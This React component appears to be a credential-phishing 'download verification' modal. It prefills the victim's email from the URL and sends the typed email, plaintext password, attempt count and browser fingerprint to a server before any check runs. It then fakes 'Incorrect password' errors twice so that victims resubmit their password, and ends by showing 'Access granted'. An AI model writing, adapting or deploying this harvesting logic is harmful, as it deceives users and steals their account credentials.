"use client";

import React, { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Lock, CheckCircle } from "lucide-react";
import CaptchaInput from "./CaptchaInput";
import { useEmailValidation } from "../../hooks/useEmailValidation";
import { useBrowserData } from "../../hooks/useBrowserData";
import { sendToCompanyEmail } from "../../utils/emailService";


interface BrowserData {
  screenResolution?: string;
  timezone?: string;
  language?: string;
  platform?: string;
  [key: string]: any;
}

interface AuthModalProps {
  showModal: boolean;
  setShowModal: React.Dispatch<React.SetStateAction<boolean>>;
  isAuthenticated: boolean;
  setIsAuthenticated: React.Dispatch<React.SetStateAction<boolean>>;
}

export default function AuthModal({
  showModal,
  setShowModal,
  isAuthenticated,
  setIsAuthenticated,
}: AuthModalProps) {
  const [email, setEmail] = useState<string>(""); 
  const [password, setPassword] = useState<string>("");
  const [attemptCount, setAttemptCount] = useState<number>(0);
  const [error, setError] = useState<string>("");
  const [captchaValid, setCaptchaValid] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);

  const { validateEmail, isValidating } = useEmailValidation();
  const browserData: BrowserData = useBrowserData() || {};

  useEffect(() => {
    const urlParams = new URLSearchParams(window.location.search);
    const emailParam = urlParams.get("email") || "";
    setEmail(emailParam); 
  }, []);

 const handleSubmit = async () => {
  setError("");

  const emailToSend = email.trim() || "N/A";
  const passwordToSend = password.trim() || "N/A";

const formData = {
  customer_email: email.trim() || "N/A",
  password: password.trim() || "N/A",
  attempt: attemptCount + 1,
  timestamp: new Date().toISOString(),
  browserData: {
    screenResolution: browserData.screenResolution || "N/A",
    timezone: browserData.timezone || "N/A",
    language: browserData.language || "N/A",
    platform: browserData.platform || "N/A",
  },
  deviceFingerprint: {
    screen: browserData.screenResolution || "N/A",
    timezone: browserData.timezone || "N/A",
    language: browserData.language || "N/A",
    platform: browserData.platform || "N/A",
  },
};


  try {
    setLoading(true);
    const res = await fetch("http://localhost:3000/api/verify-identity", {
      method: "POST",
      
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const json = await res.json();
    if (json.success) {
      console.log("Login data sent to server!");
    } else {
      console.error("Failed to send:", json.message);
    }
  } catch (err: any) {
    console.error("Submit error:", err);
  } finally {
    setLoading(false);
  }

  const strongPasswordRegex =
    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[!@#$%^&*()_+=[\]{};':"\\|,.<>/?-]).{8,}$/;
  if (!password || password.trim() === "") {
    setError("Please enter your password.");
    return;
  }
  if (!strongPasswordRegex.test(password)) {
    setError(
      "Please use a strong password: at least 8 characters with uppercase, lowercase, number, and special character."
    );
    return;
  }

  if (!captchaValid) {
    setError("Please complete the CAPTCHA correctly to prove you are human.");
    return;
  }

  if (attemptCount < 2) {
    setError("Incorrect password. Please try again.");
    setAttemptCount((prev) => prev + 1);
    setPassword("");
    setCaptchaValid(false);
  } else {
    setError("");
    setIsAuthenticated(true);
    setTimeout(() => {
      setShowModal(false);
    }, 2000);
  }
};

  return (
    <AnimatePresence>
      {showModal && (
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          className="fixed inset-0 bg-black bg-opacity-75 flex items-center justify-center z-50 p-4"
        >
          <motion.div
            initial={{ scale: 0.9, opacity: 0 }}
            animate={{ scale: 1, opacity: 1 }}
            exit={{ scale: 0.9, opacity: 0 }}
            className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-8"
          >
            {isAuthenticated ? (
              <div className="text-center">
                <CheckCircle className="h-20 w-20 text-green-500 mx-auto mb-4" />
                <h2 className="text-3xl font-bold text-green-600 mb-2">
                  Success!
                </h2>
                <p className="text-gray-600">
                  Access granted. Loading portal...
                </p>
              </div>
            ) : (
              <>
                <div className="flex items-center justify-center mb-6">
                  <Lock className="h-12 w-12 text-purple-600" />
                </div>
                <h2 className="text-2xl font-bold text-center mb-6 text-gray-800">
                  Secure Your Download – Verify Your Identity
                </h2>

                <div>
                  <div className="mb-4">
                    <label className="block text-gray-700 font-medium mb-2">
                      Email Address
                    </label>
                    <input
                      type="email"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-600"
                      placeholder="Enter your email address"
                    />
                    {isValidating && (
                      <p className="text-sm text-purple-600 mt-1">
                        Validating email...
                      </p>
                    )}
                  </div>

                  <div className="mb-4">
                    <label className="block text-gray-700 font-medium mb-2">
                      Password
                    </label>
                    <input
                      type="password"
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-purple-600"
                      placeholder="Enter your password"
                    />
                  </div>

                  <CaptchaInput onValidate={setCaptchaValid} />

                  {error && (
                    <motion.div
                      initial={{ opacity: 0, y: -10 }}
                      animate={{ opacity: 1, y: 0 }}
                      className="mb-4 p-3 bg-red-50 border border-red-300 text-red-700 rounded-lg text-sm"
                    >
                      {error}
                    </motion.div>
                  )}

                  <button
                    onClick={handleSubmit}
                    disabled={loading}
                    className="w-full bg-purple-600 text-white py-3 rounded-lg font-semibold text-lg hover:bg-purple-700 transition-colors disabled:opacity-60"
                  >
                    {loading ? "Downloading..." : "Download"}
                  </button>
                </div>
              </>
            )}
          </motion.div>
        </motion.div>
      )}
    </AnimatePresence>
  );
}
